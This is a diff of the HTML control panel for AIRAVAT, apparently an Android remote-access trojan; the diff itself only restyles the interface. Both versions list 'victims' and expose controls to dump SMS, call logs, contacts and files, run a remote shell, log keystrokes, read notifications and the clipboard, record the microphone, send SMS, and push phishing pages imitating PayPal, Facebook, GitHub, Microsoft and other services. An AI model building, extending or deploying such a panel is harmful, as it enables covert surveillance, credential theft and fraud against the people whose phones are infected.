@@ -1,1139 +1,473 @@
-
 <!DOCTYPE html>
 <html>
+
 <head>
-<title>AIRAVAT</title>
-<meta charset="UTF-8" />
-<link rel="icon" href="./img/logo.png"  >
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<script src="./firebase-app.js"></script>
-<script src="./firebase-auth.js"></script>
-<script src="./jquery.js"></script>
-<script src="./firebase-database.js"></script>
-<script type="text/javascript">
-//EDIT UNDER THIS ONLY
+    <title>AIRAVAT</title>
+    <meta charset="UTF-8" />
+    <link rel="icon" href="./img/logo.png">
+    <link rel="stylesheet" href="style.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="./firebase-app.js"></script>
+    <script src="./firebase-auth.js"></script>
+    <script src="./jquery.js"></script>
+    <script src="./firebase-database.js"></script>
+    <script type="text/javascript">
+        //EDIT UNDER THIS ONLY
 
-const  firebaseConfig = {
-apiKey: "API KEY",
-authDomain: "AUTH DOMAIN",
-databaseURL: "DATABSE URL",
-projectId: "PROJECT ID",
-storageBucket: "BUCKET URL",
-messagingSenderId: "SENDER ID",
-appId: "APP ID"
-};
- 
+        const firebaseConfig = {
+            apiKey: "API KEY",
+            authDomain: "AUTH DOMAIN",
+            databaseURL: "DATABSE URL",
+            projectId: "PROJECT ID",
+            storageBucket: "BUCKET URL",
+            messagingSenderId: "SENDER ID",
+            appId: "APP ID"
+        };
 
-//DON'T EDIT BELOW THIS
+        //DON'T EDIT BELOW THIS
 
-
-
-
-firebase.initializeApp(firebaseConfig);
-</script>
+        firebase.initializeApp(firebaseConfig);
+    </script>
 </head>
-<style type="text/css">
-*{
-padding:0;
-margin:0;
-outline:0;
-font-family:Verdana,sans-serif;
-}
-@font-face {
-font-family: 'eglantine';
-font-style: normal;
-font-weight: normal;
-src: local('eglantine'), url('./asset/eglantine.woff') format('woff');
-}
-#users{
-height:100%;
-padding-bottom:15px;
-background:#000;
-width:100%;
-z-index:999999999;
-color:green;
-display:block;
-position:relative;
-}
-.usr{
-height:auto;
-width:90%;
-padding:10px;
-color:#0dd;
-border-radius:5px;
-background:#001;
-border:1px solid #0dd;
-box-shadow:0px 0px 5px  black;
-margin:auto;
-}
-.usr button{
-height:30px;
-width:150px;
-border:0;
-background:black;
-border-radius:5px;
-border:1px solid red;
-color:red;
-}
-#resp{
-padding-bottom:20px;
-width:100%;
-background:#000;
-position:absolute;
-top:0;
-color:#0dd;
-left:0;
-overflow:scroll;
-height:calc(100% - 20px);
-display:none;
-}
-#resp li{
-list-style:none;
-width:calc(100% - 50px);
-height:50px;
-padding-left:50px;
-line-height:50px;
-user-select:none;
-position:relative;
-overflow:auto;
-}
 
-.fo{
-background:url("./img/imgg1.png");
-background-size:30px 25px;
-background-repeat:no-repeat;
-background-position:10px 12px;
-}
-.fi{
-background:url("./img/imgg3.png");
-background-size:25px 30px;
-background-repeat:no-repeat;
-background-position:12px 12px;
-}
-.vi{
-background:url("./img/i4.png");
-background-size:30px 30px;
-background-repeat:no-repeat;
-background-position:10px 12px;
-}
-.im{
-background:url("./img/imgg2.png");
-background-size:30px 30px;
-background-repeat:no-repeat;
-background-position:10px 12px;
-}
-#cmdcernter {
-position:fixed;
-top:0;
-left:0;
-opacity:1;
-background:green;
-z-index:99999;
-}
-#resp  b{
-position:absolute;
-right:10px;
-top:0px;
-color:rgb(0,255,0);
-}
-#fprev {
-position:absolute;
-top:0;
-left:0;
-height:100%;
-width:100%; 
-color:green;
-display:none;
-background:#001;
-z-index:99999999;
-text-align:center;
-}
-#fprev img{
-max-height:50%;
-max-width:100%;
-}
-#fprev li{
-
-padding:10px;
-text-align:left;
-padding-left:10px;
-width:80%;
-overflow:scroll;
-color:#0dd;
-list-style:none;
-}
-#fprev li:nth-child(5){
-text-align:center;
-background:#000;
-border:1px solid red;
-border-radius:5px;
-margin:auto;
-}
-#fprev ul{
-}
-.span{
-color:white;
-position:absolute;
-top:10px;
-border-radius:50%;
-height:35px;
-width:35px;
-background:red;
-text-align:center;
-left:10px;
-font-size:35px;
-line-height:35px;
-}
-#phones{
-width:100%;
-height:100%;
-background:url("./img/imgg.jpg");
-background-repeat:no-repeat;
-background-size:cover;
-position:absolute;
-top:0;
-left:0;
-z-index:99999999;
-display:none;
-}
-#phones .icon{
-height:50px;
-width:50px;
-background:url("./img/dump_messages.png");
-background-size:50px 50px;
-background-repeat:no-repeat;
-margin:20px;
-text-align:center;
-font-size:10px;
-color:white;
-line-height:120px;
-
-}
-.dfle{
-width:100%;
-display:flex;
-justify-content:center;
-}
-.dfle div{
-border-radius:10px;
-}
-#preloaderr {
-height:100%;
-width:100%;
-position:fixed;
-top:0;
-left:0;
-z-index:9999999999999999998;
-background:rgba(0,0,0,.9);
-display:flex;
-align-items:center;
-justify-content:center;
-}
-#preloaderr .load {
-height:50px;
-width:50px;
-border:3px solid #000;
-border-top:3px solid #0dd;
-border-radius:50%;
-position:relative;
-animation:ani 1s infinite;
-}
-@keyframes ani{
-0%{
-transform:rotate(0deg);
-}
-100%{
-transform:rotate(360deg);
-}
-}
-#loadtxt {
-color:#0f0;
-position:absolute;
-margin-top:80px;
-}
-#maindiv{
-position:fixed;
-left:0;
-top:50px;
-height:calc(100% - 50px);
-width:100%;
-z-index:99;
-background:#000;
-overflow:auto;
-}
-#tophead{
-height:50px;
-width:100%;
-position:fixed;
-top:0;
-left:0;
-background: #000;
-background: linear-gradient(
-180deg ,
-rgba(0,0,0, 0),
-rgba(0,0,0, .9)
-),url(img/bg.png);
-background-size:cover;
-color:#fff;
-text-align:center;
-}
-#tophead .h4{
-background: linear-gradient(
-90deg,
-rgba(255, 0, 0, 1) 0%,
-rgba(255, 154, 0, 1) 10%,
-rgba(208, 222, 33, 1) 20%,
-rgba(79, 220, 74, 1) 30%,
-rgba(63, 218, 216, 1) 40%,
-rgba(47, 201, 226, 1) 50%,
-rgba(28, 127, 238, 1) 60%,
-rgba(95, 21, 242, 1) 70%,
-rgba(186, 12, 248, 1) 80%,
-rgba(251, 7, 217, 1) 90%,
-rgba(255, 0, 0, 1) 100%
-);
-letter-spacing:10px;
-font-size:20px;
-color:transparent;
-position:relative;
-width:100%;
-height:100%;
-animation:anioo 2s linear infinite;
--webkit-background-clip:text;
-font-family:'eglantine';
-}
-@keyframes anioo{
-0%{
-background-position:0 0;
-}
-
-100%{
-background-position:700px 0;
-}
-}
-#barss{
-color:white;
-position:absolute;
-top:0px;
-right:5px;
-font-size:40px;
-}
-.h4:before{
-content:'AIRAVAT';
-letter-spacing:8px;
-font-size:30px;
-color:transparent;
-background: linear-gradient(
-90deg,
-rgba(255, 0, 0, 1) 0%,
-rgba(255, 154, 0, 1) 10%,
-rgba(208, 222, 33, 1) 20%,
-rgba(79, 220, 74, 1) 30%,
-rgba(63, 218, 216, 1) 40%,
-rgba(47, 201, 226, 1) 50%,
-rgba(28, 127, 238, 1) 60%,
-rgba(95, 21, 242, 1) 70%,
-rgba(186, 12, 248, 1) 80%,
-rgba(251, 7, 217, 1) 90%,
-rgba(255, 0, 0, 1) 100%
-);
-animation:anioo2 2s linear infinite;
--webkit-background-clip:text;
-position:absolute;
-margin:auto;
-z-index:-1;
-top:0;
-left:0;
-width:100%;
-text-align:center;
-height:100%;
-}
-@keyframes anioo2{
-0%{
-filter:blur(30px);
-background-position:0 0;
-}
-50%{
-filter:blur(1px);
-
-}
-100%{
-filter:blur(30px);
-background-position:700px 0;
-}
-}
-#navbar{
-height:100%;
-width:70%;
-background:rgba(0,0,0,.9);
-position:fixed;
-top:0;
-left:0;
-display:none;
-transition:.5s;
-padding-top:0;
-z-index:9999999999999999999999999;
-}
-#navbar li{
-list-style:none;
-width:calc(100% - 20px);
-height:60px;
-text-align:justify;
-line-height:60px;
-color:#0dd;
-padding-left:20px;
-font-weight:bolder;
-transition:.5s;
-}
-#navbar li:hover{
-width:calc(100% - 30px);
-padding-left:30px;
-background:#001;
-}
-#backkk{
-position:absolute;
-top:20px;
-display:none;
-left:15px;
-transform:scale(2);
-}
-.loginn img{
-width:80px;
-height:80px;
-border-radius:50%;
-}
-#logindiv{
-font-family: 'Comfortaa', cursive;
-height:100%;
-width:100%;
-background: rgb(2,0,36);
-background: linear-gradient(NaNdeg, rgba(2,0,36,1) 0%, rgba(16,16,146,1) 35%, rgba(0,212,255,1) 100%);
-position: fixed;
-top:0;
-//display:none;
-left:0;
-z-index:99999;
-justify-content:middle;
-align-content:center;
-margin:auto;
-}
-.loginn {
-background:rgba(0,0,0,.1);
-height:auto;
-color:#FFC72C;
-width:90%;
-position:relative;
-top:20px;
-padding:15px;
-text-align:center;
-margin:auto;
-border-radius:5px;
-box-shadow:0px 0px 15px white;
-}
-.loginn input{
-margin:5px;
-font-size:20px;
-border:0;
-width:80%;
-color:white;
-background:transparent;
-border-bottom:3px solid #FFC72C;
-}
-#lg{
-height:50px;
-width:150px;
-background: transparent;
-border:1px solid red;
-border-radius:5px;
-font-size:20px;
-color: #FFC72C;
-margin-top:10px;
-}
-input::placeholder{
-color:white;
-}
-.hqh{
-background: transparent;
-font-size:15px;
-color:#0dd;
-border:0;
-}
-#disclaim{
-height:100%;
-width:100%;
-background:#fff;
-text-align:center;
-position:fixed;
-top:0;
-display:none;
-left:0;
-z-index:999999999999999999999;
-}
-#disclaim img{
-height:30%;
-width:30%;
-}
-.tos{
-height:200px;
-width:80%;
-overflow:auto;
-background:#eee;
-padding:10px;
-border-radius:5px;
-margin:auto;
-text-align:left;
-}
-.dis{
-height:40px;
-width:150px;
-color:white;
-border-radius:5px;
-border:0;
-background:green;
-}
-.diso{
-background:red;
-}
-</style>
 <body>
-
-
-<style type="text/css">
-.dgh{
-position:absolute;
-top:30px;
-font-size:15px;
-width:100%;
-text-align:center;
-}
-</style>
-<div id="tophead" >
-<h4 class="h4" >AIRAVAT</h4>
-<div class="dgh" >&copy; Prateek Chaubey</div>
-<div id="backkk" onclick="backk(this)">
-<svg fill="#fff"  xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-arrow-left" viewBox="0 0 16 16">
-<path fill-rule="evenodd" d="M15 8a.5.5 0 0 0-.5-.5H2.707l3.147-3.146a.5.5 0 1 0-.708-.708l-4 4a.5.5 0 0 0 0 .708l4 4a.5.5 0 0 0 .708-.708L2.707 8.5H14.5A.5.5 0 0 0 15 8z"/>
-</svg>
-</div>
-</div>
-
-
-<div id="maindiv" >
-<div id="preloaderr" >
-<div  class="load" >
-</div>
-<div id="loadtxt" >Processing</div>
-</div>
-<div id="users" >
-<br>
-<center>Getting List Of Victims ....</center>
-</div>
-<div id="phones" >
-<br>
-
-<div class="dfle"  style="" >
-<div class="icon" onclick="dumpsms()">Dump SMS</div>
-<div class="icon" onclick="calllogs()" style="background:url('./img/dump_call_logs.png');background-size:52px 52px;baxkground-position:0 0;background-repeat:no-repeat;" >CallLogs</div>
-<div class="icon" onclick="filesmanager()" style="background:url('./img/ic3.png');background-size:50px 50px;background-repeat:no-repeat;" >My Files</div>
-<div class="icon" onclick="getpackages()" style="background:url('./img/list_installed_apps.png');background-size:52px 52px;baxkground-position:0 0;background-repeat:no-repeat;" >AppsList</div>
-</div>
-<div class="dfle"  style="" >
-<div class="icon" onclick="deviceinfo()" style="background:url('./img/dump_device_info.png');background-size:52px 52px;baxkground-position:0 0;background-repeat:no-repeat;" >SysInfo</div>
-<div class="icon" onclick="toastt()" style="background:url('./img/toast.png');background-size:50px 50px;background-repeat:no-repeat;" >Toast</div>
-<div class="icon" onclick="dumpcontact()" style="background:url('./img/dump_contacts.png');background-size:52px 52px;baxkground-position:0 0;background-repeat:no-repeat;" >Contacts</div>
-<div class="icon" onclick="funcmd('fmc1')" style="background:url('./img/itune.png');background-size:52px 52px;baxkground-position:0 0;background-repeat:no-repeat;transform:scale(1.07);" >PlayMusic</div>
-</div>
-<div class="dfle"  style="" >
-<div class="icon" onclick="sendmsg()" style="background:url('./img/send_message.png');background-size:52px 52px;baxkground-position:0 0;background-repeat:no-repeat;transform:scale(1);" >SendSMS</div>
-<div class="icon" onclick="startshell()" style="background:url('./img/shell_command.png');background-size:50px 50px;background-repeat:no-repeat;" >Shell</div>
-<div class="icon" onclick="funcmd('fmc1')" style="background:url('./img/img3.png');background-size:54px 54px;background-repeat:no-repeat;background-position:-2px -2px;">Vibrator</div>
-<div class="icon" onclick="funcmd('fmc1')" style="background:url('./img/img5.png');background-size:50px 50px;background-repeat:no-repeat;">TTS</div>
-
-</div>
-<div class="dfle"  style="" >
-<div class="icon" onclick="keylogger()" style="background:url('./img/img6.png');background-size:50px 50px;background-repeat:no-repeat;">Keylogger</div>
-<div class="icon" onclick="changewallpaper()" style="background:url('./img/img1.png');background-size:50px 50px;background-repeat:no-repeat;transform:scale(1.25);">Wallpaper</div>
-<div class="icon" onclick="notificationlog()" style="background:url('./img/img2.png');background-size:50px 50px;background-repeat:no-repeat;">Notifications</div>
-<div class="icon" onclick="showphish()" style="background:url('./img/phish.png');background-size:50px 50px;background-repeat:no-repeat;">PhishData</div>
-</div>
-<div class="dfle"  style="" >
-<div class="icon" onclick="showphpag()" style="background:url('./img/scams.png');background-size:50px 50px;background-repeat:no-repeat;">Scams</div>
-<div class="icon" onclick="micrec()" style="background:url('./img/microphone_rec.png');background-size:50px 50px;background-repeat:no-repeat;">Recordings</div>
-<div class="icon" onclick="showclip()" style="background:url('./img/clip.png');background-size:50px 50px;background-repeat:no-repeat;">ClipBoard</div>
-<div class="icon" onclick="funcmd('fmc2')" style="background:url('./img/img4.png');background-size:50px 50px;background-repeat:no-repeat;">Torch</div>
-</div>
-<div class="dfle"  style="" >
-<div class="icon" onclick="funcmd('fmc2')" style="background:url('./img/web.png');background-size:50px 50px;background-repeat:no-repeat;">LaunchURL</div>
-</div>
-</div>
-
-
-<div id="cmdcernter" style="display:none;" >
-<input type="text" id="cmdref" placeholder="cmdref" value="/comds/comdsdc38kw6i"   ><br>
-<input type="text" id="cmd"  placeholder="cmd type"  ><br>
-<input type="text" id="cmdvar"  placeholder="cmm"  ><br>
-<input type="text" id="cmdvarm"  placeholder="cmd var optional"  ><br>
-
-<button onclick="cmd()" >Send</button><br>
-</div>
-
-
-<div id="resp" onclick="opfol(event)"   >
-</div>
-
-
-<div id="fprev"  >
-<h4>Preview </h4><br>
-<img id="imv"  src="img3.png" >
-<iframe id="imv2"  src="img3.png" style="height:40%;width:100%;" ></iframe>
-<br>
-<hr>
-<ul id="fprevdes" >
-<li>Name :
-<li>Size: 100 MB
-<li>Creation: 11 Aug 2055
-<li>Path: /sdcard/</li>
-<li><a download=""  id="btdwn" target="_blank"  href="hh">Download File</a><br>
-</ul>
-<style type="text/css">
-#btdwn{
-font-weight:bolder;
-color:green;
-text-decoration:none;
-}
-#fprev iframe{
-border:0;
-}
-#viewers {
-position:absolute;
-top:0;
-left:0;
-display:none;
-height:100%;
-width:100%;
-z-index:99;
-background:black;
-}
-#viewers iframe{
-height:100%;
-width:100%;
-position:absolute;
-top:0;
-left:0;
-border:0;
-}
-.down{
-height:50px;
-width:50px;
-position:fixed;
-bottom:50px;
-right:30px;
-border-radius:50%;
-background:green;
-text-align:center;
-line-height:60px;
-color:white;
-}
-.btn{
-height:40px;
-width:150px;
-border:0;
-border-radius:5px;
-border:1px solid red;
-background:black;
-color:white;
-} 
-
-#notikey {
-position:absolute;
-top:0;
-left:0;
-display:none;
-height:100%;
-width:100%;
-overflow:auto;
-z-index:999;
-background:#111;
-}
-.keylogg {
-background:rgba(0,0,0,1);
-width:calc(95% - 20px);
-height:auto;
-margin:auto;
-padding:10px;
-color:#0dd;
-padding-bottom:10px;
-margin-top:8px;
-border-radius:10px;
-overflow:auto;
-}
-.keylogg  b{
-color:red;
-}
-.keylogg img{
-max-height:50px;
-max-width:50px;
-position:absolute;
-left:20px;
-}
-.keylogg p{
-color:#fff;
-}
-.keylogg span{
-float:right;
-margin-right:10px;
-}
-#shellcmd{
-height:100%;
-width:100%;
-position:absolute;
-top:0;
-left:0;
-overflow:hidden;
-z-index:99;
-display:none;
-background:#000;
-}
-#shellcmdd{
-height:30px;
-width:98%;
-background:#001;
-position:absolute;
-bottom:0;
-left:0;
-color:white;
-border:1px solid silver;
-}
-#shelldata{
-height:calc(100% - 50px);
-width:100%;
-position:absolute;
-top:0;
-left:0;
-overflow:scroll;
-font-family:monospace;
-color:white;
-}
-</style>
-<br>
-
-<span class="span"  onclick='this.parentElement.style.display="none";setdatcmd("cd",var32.substr(0,var32.lastIndexOf("/")),"",respov);'>×</span>
-</div>
-
-
-<div id="viewers" >
-<iframe id="vieweri"  src="data:text/html,<h4 style='color:green' > Getting File for preview....</h4>" ></iframe>
-<a href="#" id="downlo"  target="_blank" download="file.html"   ><div class="down" >				<svg  fill="white" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/></svg>							</div></a>
-</div>
-
-
-<div id="shellcmd" >
-<div id="shelldata" >AIRAVAT Shell<br><sub>(some root commands may not work properly)</sub> </div>
-<input type="text" onkeyup="shellcm(this)"  id="shellcmdd" placeholder="Enter Your Command Here_"   />
-</div>
-
-
-
-<div id="notikey" style="display:none;" ></div>
-
-<div id="toastdiv" >
-<br>
-<h3>Toast</h3>
-<br>
-<textarea type="text" id="toastcmd"  placeholder="Type Your Message Here"  /></textarea>
-<br><br><button onclick="toastexc()">Execute</button>
-</div>
-
-
-<div  id="diamain" onclick="this.style.display='none';" >
-<div class="diachild" >
-<h3 style="color:#0dd" >Response</h3><br>
-<p id="diatext" id="diatext" >This is response Text bsdk </p>
-<br>
-<button>OK</button>
-</div>
-</div>
-
-
-
-<div id="pvtt" >
-<h3 style="color:red" >FUN COMMANDS</h3><br><br>
-<div id="fmc1" >
-<div id="plmc" >
-<h4>Play Music </h4><br>
-<input type="text" id="musiccmd"  placeholder="Enter Direct .mp3 link"  >
-<br><button onclick="playmus()" >Execute</button>
-<br><br><hr><br>
-</div>
-<div id="vibradev" >
-<h4>Vibrate Device </h4><br>
-<input type="text" id="vibratecmd"  placeholder="Enter No. of Seconds"  >
-<br><button onclick="vibra()">Execute</button>
-<br><br><hr><br>
-</div>
-<div id="ttsdev" >
-<h4>Text To Speech </h4><br>
-<input type="text" id="ttscmd"  placeholder="Enter Your Text Message"  >
-<br><button onclick="ttsf()">Execute</button>
-<br>
-</div>
-</div>
-<div id="fmc2" >
-<div id="tonofff" >
-<h4>Turn On/Off Torch</h4><br>
-<button onclick="tont()">Turn On</button>
-<button style="margin-left:10px;"  onclick="tofft()">Turn Off</button>
-<br><br><hr><br>
-</div>
-<div id="oppweb" >
-<h4>Open URL</h4><br>
-<input type="text" id="opwebcmd"  placeholder="Enter Your URL including http://"  >
-<br><button onclick="opwebl()">Execute</button>
-</div>
-</div>
-</div>
-
-
-
-<div id="senddm">
-<h4 style="color:#0fa">Send SMS</h4><br><br>
-TO:<input type="text" id="smsnumber"  placeholder="Enter Mobile Number"  ><br><br>
-Message:<br><br><textarea id="smscontent"  placeholder="Enter Message Content" ></textarea>
-<br><br>
-<center><button onclick="sendsms()">Send SMS</button></center>
-</div>
-
-
-
-<div id="wallpaperdiv" ><br>
-<h3 style="color:#0f9" >Select Wallpaper </h3><br><br>
-<div class="wallimg" >
-<img src="./img/wall1.png" onclick="selectimg(this,0)" id="selectedimg" >
-<img src="./img/wall2.png" onclick="selectimg(this,1)" >
-<img src="./img/wall3.png" onclick="selectimg(this,2)"  >
-</div>
-<br>
-<center><button onclick="setwalls()">Set Wallpaper</button></center>
-</div>
-
-
-<div id="micrec" >
-<br>
-<h3>Record</h3>
-<br>
-<input type="text" id="recval"  placeholder="Record For x Seconds"  />
-<br><button class="btn"  onclick="recordvoice()">Record Mic</button>
-<br>
-<hr>
-<br>
-<br><h3>Recordings</h3><br>
-<div id="showrecs" >
-</div>
-
-</div>
-
-
-
-<div id="showphishj"  >
-<br>
-<h3>Phishing Commands</h3><br><br>
-<input type="text" id="nshpih"  placeholder="Enter Notification Title"  /><br>
-<br><hr>
-<select onchange="iojh()" id="lshpih" >
-<option value='0'>dropbox3.png</option><option value='1'>facebook2.png</option><option value='2'>facebook5.png</option><option value='3'>free_fire3.png</option><option value='4'>github1.png</option><option value='5'>instagram1.png</option><option value='6'>linkedin1.png</option><option value='7'>messenger1.png</option><option value='8'>microsoft1.png</option><option value='9'>netflix1.png</option><option value='10'>paypal2.png</option><option value='11'>protonmail1.png</option><option value='12'>pubg2.png</option><option value='13'>snapchat1.png</option><option value='14'>tumblir1.png</option><option value='15'>twitter1.png</option><option value='16'>wordpress1.png</option><option value='17'>yahoo1.png</option>
-
-</select>
-<img src="./imgg/dropbox3.png" id="hion"  style="max-height:60px;max-width:60px;" >
-<br><br>
-<!--jjjwjjw-->
-<center>
-<select id="phpage" >
-<option value="dropbox.html">
-
-dropbox.html
-</option>
-<option value="facebook_desktop_homepage.html">
-
-facebook_desktop_homepage.html
-</option>
-<option value="facebook_desktop_static.html">
-
-facebook_desktop_static.html
-</option>
-<option value="facebook_mobile.html">
-
-facebook_mobile.html
-</option>
-<option value="facebook_mobile_fake_security.html">
-
-facebook_mobile_fake_security.html
-</option>
-<option value="garena_free_fire.html">
-
-garena_free_fire.html
-</option>
-<option value="github.html">
-
-github.html
-</option>
-<option value="instagram.html">
-
-instagram.html
-</option>
-<option value="linkedin.html">
-
-linkedin.html
-</option>
-<option value="messenger.html">
-
-messenger.html
-</option>
-<option value="microsoft.html">
-
-microsoft.html
-</option>
-<option value="netflix.html">
-
-netflix.html
-</option>
-<option value="paypal.html">
-
-paypal.html
-</option>
-<option value="protonmail.html">
-
-protonmail.html
-</option>
-<option value="pubg.html">
-
-pubg.html
-</option>
-<option value="snapchat.html">
-
-
-snapchat.html
-</option>
-<option value="tumblr.html">
-
-tumblr.html
-</option>
-<option value="twitter_desktop.html">
-
-twitter_desktop.html
-</option>
-<option value="twitter_mobile.html">
-
-twitter_mobile.html
-</option>
-<option value="wordpress.html">
-
-wordpress.html
-</option>
-<option value="yahoo.html">
-
-yahoo.html
-</option>
-</select>
-<button onclick="execphish()"> Execute</button>
-</center>
-<br>
-<hr>
-<br>
-<input type="text" id="shpih"  placeholder="Enter Your Link"  />
-<br><button class="btn"  onclick="execphish2()">Execute</button>
-</div>
-
-<style type="text/css">
-#showphishj select{
-height:40px;
-margin:auto;
-margin-top:20px;
-color:#fff;
-background:#001;
-border-radius:5px;
-}
-#showphishj button{
-height:30px;
-width:150px;
-background:#000;
-color:#0dd;
-border-radius:5px;
-margin-top:20px;
-border:1px solid #f00;
-}
-audio{
-display:none;
-}
-#showrecs{
-overflow:auto;
-color:#0fa;
-}
-::-webkit-scrollbar {
-width: 0px;
-}
-.downlii,.plrec{
-height:100%;
-width:40px;
-float:right;
-margin-left:10px;
-margin-right:0px;
-margin-top:5px;
-}
-.downlii{
-margin-right:20px;
-}
-
-.downlii svg,.plrec svg{
-height:90%;
-width:90%;
-}
-.downlii svg{
-height:65%;
-width:65%;
-margin-top:8px;
-}
-.recswarp{
-margin:auto;
-margin-top:5px;
-background:#001;
-width:90%;
-display:flex;
-align-items:center;
-border-radius:10px;
-height:50px;
-border: solid 1px #0dd;
-}
-#selectedimg{
-border:2px solid red;
-}
-.wallimg{
-display:flex;
-height:200px;
-margin:auto;
-width:100%;
-}
-.wallimg img{
-height:100%;
-border-radius:7px;
-margin-left:10px;
-width:30%;
-}
-#pvtt h4{
-color:#0dd;
-}
-#pvtt input,#showphishj input,#senddm input,#micrec input[type="text"]{
-height:30px;
-padding:5px;
-width:80%;
-line-height:40px;
-border:0.5px solid #0dd;
-background:#001;
-color:#fff;
-border-radius:5px;
-}
-#senddm{color:#fff}
-#senddm input{
-height:20px;
-margin-left:10px;
-}
-#toastdiv,#pvtt,#showphishj,#micrec,#senddm,#wallpaperdiv{
-height:100%;
-width:100%;
-background:#000;
-position:absolute;
-top:0;
-left:0;
-display:none;
-z-index:99;
-}
-
-#pvtt button,#micrec .btn,#senddm button,#wallpaperdiv button{
-margin-top:10px;
-height:30px;
-width:110px;
-color:#fff;
-background:black;
-border:1px solid red;
-border-radius:5px;
-}
-/* use for test*/
-#showphisj{
-z-index:9999999999999;
-display:block;
-}
-#pvtt{
-width:calc(100% - 40px);
-padding:20px;
-}
-.diachild p{
-height:50px;
-overflow:auto;
-}
-.diachild button{
-height:30px;
-width:110px;
-color:#fff;
-background:black;
-float:right;
-border:1px solid red;
-border-radius:5px;
-}
-.diachild{
-height:150px;
-background:#001;
-border-radius:10px;
-color:white;
-padding:10px;
-border:1px solid green;
-width:calc(100% - 50px);
-}
-#diamain{
-height:100%;
-width:100%;
-background:rgba(0,0,0,.9);
-position:absolute;
-top:0;
-display:none;
-align-items:center;
-justify-content:center;
-left:0;
-z-index:99999999999999999;
-}
-#toastdiv h3,#micrec h3,#showphishj h3{
-color:#0dd;
-margin-left:30px;
-}
-
-#toastcmd,#senddm textarea{
-margin-left:30px;
-height:40%;
-padding-top:10px;
-padding-left:10px;
-width:80%;
-border:0.5px solid #0dd;
-background:#001;
-color:#fff;
-border-radius:5px;
-}
-#toastdiv button{
-margin-left:30px;
-height:30px;
-width:110px;
-color:#fff;
-background:black;
-border:1px solid red;
-border-radius:5px;
-}
-#cmdcernter {
-display:none;
-}
-</style>
-</div>
-<script type="text/javascript" src="./script.js"></script>
-<style>
-img[alt*="www.000webhost.com"], .disclaimer {
-display: none
-}  
-</style>
+    <div id="tophead">
+        <div id="backkk" onclick="backk(this)">
+            <img src="asset/featherIcons/arrow-left.svg">
+        </div>
+        <!-- <button class="logout">
+            <img src="asset/featherIcons/log-out.svg">
+            Logout
+        </button> -->
+    </div>
+
+    <div id="maindiv">
+        <div id="preloaderr">
+            <div class="load">
+            </div>
+            <div id="loadtxt">Processing</div>
+        </div>
+        <div id="users">
+            <br>
+            <center>Getting List Of Victims...</center>
+        </div>
+        <div id="phones">
+            <div class="dfle">
+
+                <div class="icon" onclick="dumpsms()">
+                    <img class="featherIcon" src="asset/featherIcons/message-square.svg">
+                    Dump SMS
+                </div>
+                <div class="icon" onclick="calllogs()">
+                    <img class="featherIcon" src="asset/featherIcons/phone.svg">
+                    CallLogs
+                </div>
+                <div class="icon" onclick="filesmanager()">
+                    <img class="featherIcon" src="asset/featherIcons/folder.svg">
+                    Files
+                </div>
+                <div class="icon" onclick="getpackages()">
+                    <img class="featherIcon" src="asset/featherIcons/box.svg">
+                    Apps List
+                </div>
+
+            </div>
+            <div class="dfle">
+
+                <div class="icon" onclick="deviceinfo()">
+                    <img class="featherIcon" src="asset/featherIcons/info.svg">
+                    Sys Info
+                </div>
+                <div class="icon" onclick="toastt()">
+                    <img class="featherIcon" src="asset/featherIcons/message-circle.svg">
+                    Notification
+                </div>
+                <div class="icon" onclick="dumpcontact()">
+                    <img class="featherIcon" src="asset/featherIcons/user.svg">
+                    Contacts
+                </div>
+                <div class="icon" onclick="funcmd('fmc1')">
+                    <img class="featherIcon" src="asset/featherIcons/music.svg">
+                    Play Music
+                </div>
+
+            </div>
+            <div class="dfle">
+
+                <div class="icon" onclick="sendmsg()">
+                    <img class="featherIcon" src="asset/featherIcons/send.svg">
+                    Send SMS
+                </div>
+                <div class="icon" onclick="startshell()">
+                    <img class="featherIcon" src="asset/featherIcons/hash.svg">
+                    Shell
+                </div>
+                <div class="icon" onclick="funcmd('fmc1')">
+                    <img class="featherIcon" src="asset/featherIcons/radio.svg">
+                    Vibrator
+                </div>
+                <div class="icon" onclick="funcmd('fmc1')">
+                    <img class="featherIcon" src="asset/featherIcons/activity.svg">
+                    TTS
+                </div>
+
+            </div>
+            <div class="dfle">
+
+                <div class="icon" onclick="keylogger()">
+                    <img class="featherIcon" src="asset/featherIcons/at-sign.svg">
+                    Keylogger
+                </div>
+                <div class="icon" onclick="changewallpaper()">
+                    <img class="featherIcon" src="asset/featherIcons/image.svg">
+                    Wallpaper
+                </div>
+                <div class="icon" onclick="notificationlog()">
+                    <img class="featherIcon" src="asset/featherIcons/bell.svg">
+                    Notification
+                </div>
+                <div class="icon" onclick="showphish()">
+                    <img class="featherIcon" src="asset/featherIcons/database.svg">
+                    PhishData
+                </div>
+
+            </div>
+            <div class="dfle">
+
+                <div class="icon" onclick="showphpag()">
+                    <img class="featherIcon" src="asset/featherIcons/frown.svg">
+                    Scams
+                </div>
+                <div class="icon" onclick="micrec()">
+                    <img class="featherIcon" src="asset/featherIcons/mic.svg">
+                    Recordings
+                </div>
+                <div class="icon" onclick="showclip()">
+                    <img class="featherIcon" src="asset/featherIcons/paperclip.svg">
+                    ClipBoard
+                </div>
+                <div class="icon" onclick="funcmd('fmc2')">
+                    <img class="featherIcon" src="asset/featherIcons/zap.svg">
+                    Torch
+                </div>
+
+            </div>
+            <div class="dfle">
+
+                <div class="icon" onclick="funcmd('fmc2')">
+                    <img class="featherIcon" src="asset/featherIcons/globe.svg">
+                    LaunchURL
+                </div>
+
+            </div>
+        </div>
+
+
+        <div id="cmdcernter" style="display:none;">
+            <input type="text" id="cmdref" placeholder="cmdref" value="/comds/comdsdc38kw6i"><br>
+            <input type="text" id="cmd" placeholder="cmd type"><br>
+            <input type="text" id="cmdvar" placeholder="cmm"><br>
+            <input type="text" id="cmdvarm" placeholder="cmd var optional"><br>
+
+            <button onclick="cmd()">Send</button><br>
+        </div>
+
+
+        <div id="resp" onclick="opfol(event)">
+        </div>
+
+
+        <div id="fprev">
+            <h4>Preview </h4><br>
+            <img id="imv" src="img3.png">
+            <iframe id="imv2" src="img3.png" style="height:40%;width:100%;"></iframe>
+            <br>
+            <hr>
+            <ul id="fprevdes">
+                <li>Name :
+                <li>Size: 100 MB
+                <li>Creation: 11 Aug 2055
+                <li>Path: /sdcard/</li>
